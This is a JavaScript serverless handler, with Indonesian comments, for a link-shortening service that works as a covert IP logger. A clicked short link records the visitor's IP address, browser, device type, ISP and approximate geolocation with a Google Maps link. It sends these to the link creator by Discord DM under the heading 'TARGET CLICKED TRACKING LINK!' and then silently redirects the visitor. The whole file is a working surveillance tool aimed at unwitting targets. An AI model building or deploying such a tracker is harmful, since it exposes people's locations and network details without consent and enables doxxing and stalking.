global.linkDatabase = global.linkDatabase || {}; 

const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;

export default async function handler(req, res) {
  const { id, action, target, session } = req.query;

  // 1. BUAT LINK TRACKING
  if (action === 'create') {
    if (!target || !session) {
      return res.status(400).json({ error: 'Data tidak lengkap / Belum Login!' });
    }

    const userSession = global.userSessions ? global.userSessions[session] : null;
    if (!userSession) {
      return res.status(401).json({ error: 'Sesi login tidak valid. Silakan re-login!' });
    }

    const shortId = Math.random().toString(36).substring(2, 6);

    global.linkDatabase[shortId] = {
      target: target.startsWith('http') ? target : `https://${target}`,
      userId: userSession.id
    };

    return res.status(200).json({
      status: 'success',
      shortUrl: `https://arex.my.id/r/${shortId}`
    });
  }

  // 2. REDIRECT ENGINE & DISCORD DM LOG
  if (id) {
    const linkData = global.linkDatabase[id];
    if (!linkData) return res.redirect(302, 'https://google.com');

    // Tangkap IP & Info Device Target
    const forwarded = req.headers['x-forwarded-for'];
    const ip = forwarded ? forwarded.split(',')[0].trim() : (req.socket.remoteAddress || '127.0.0.1');
    const rawAgent = req.headers['user-agent'] || 'Unknown Device';

    let browserName = "Unknown Browser";
    if (rawAgent.includes("Chrome") && !rawAgent.includes("Edg")) browserName = "Google Chrome";
    else if (rawAgent.includes("Edg")) browserName = "Microsoft Edge";
    else if (rawAgent.includes("Safari") && !rawAgent.includes("Chrome")) browserName = "Safari";
    else if (rawAgent.includes("Firefox")) browserName = "Mozilla Firefox";

    const isMobile = rawAgent.includes("Mobile") || rawAgent.includes("Android") || rawAgent.includes("iPhone");
    const deviceType = isMobile ? "📱 Smartphone" : "💻 PC / Laptop";

    // Auto Geolocation
    let geoData = { city: 'Unknown', region: 'Unknown', country: 'Unknown', org: 'Unknown ISP', lat: '', lon: '' };
    try {
      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
      if (geoRes.ok) {
        const data = await geoRes.json();
        if (!data.error) {
          geoData = { 
            city: data.city || 'Unknown', 
            region: data.region || 'Unknown', 
            country: data.country_name || 'Unknown', 
            org: data.org || 'Unknown ISP', 
            lat: data.latitude, 
            lon: data.longitude 
          };
        }
      }
    } catch (e) {}

    const mapLink = (geoData.lat && geoData.lon) ? `https://www.google.com/maps?q=${geoData.lat},${geoData.lon}` : 'N/A';

    // Kirim DM Discord
    if (linkData.userId && DISCORD_BOT_TOKEN) {
      await sendDiscordDM(linkData.userId, {
        ip,
        org: geoData.org,
        location: `${geoData.city}, ${geoData.region}, ${geoData.country}`,
        device: deviceType,
        browser: browserName,
        target: linkData.target,
        mapLink
      });
    }

    return res.redirect(302, linkData.target);
  }

  return res.status(400).json({ error: 'Bad Request' });
}

async function sendDiscordDM(userId, data) {
  try {
    const channelRes = await fetch('https://discord.com/api/v10/users/@me/channels', {
      method: 'POST',
      headers: {
        'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ recipient_id: userId })
    });

    const channel = await channelRes.json();
    if (!channel.id) return;

    await fetch(`https://discord.com/api/v10/channels/${channel.id}/messages`, {
      method: 'POST',
      headers: {
        'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        embeds: [{
          title: "🚨 TARGET CLICKED TRACKING LINK! 🚨",
          color: 15158332,
          fields: [
            { name: "🌐 IP Address", value: `\`${data.ip}\``, inline: true },
            { name: "📡 ISP / Provider", value: data.org, inline: true },
            { name: "📍 Lokasi IP", value: data.location, inline: false },
            { name: "🖥️ Perangkat", value: data.device, inline: true },
            { name: "🌐 Browser", value: data.browser, inline: true },
            { name: "🎯 Target URL", value: data.target, inline: false },
            { name: "🗺️ Google Maps", value: `[Buka Peta Lokasi Target](${data.mapLink})`, inline: false }
          ],
          timestamp: new Date().toISOString()
        }]
      })
    });
  } catch (e) {
    console.error("DM Error:", e);
  }
}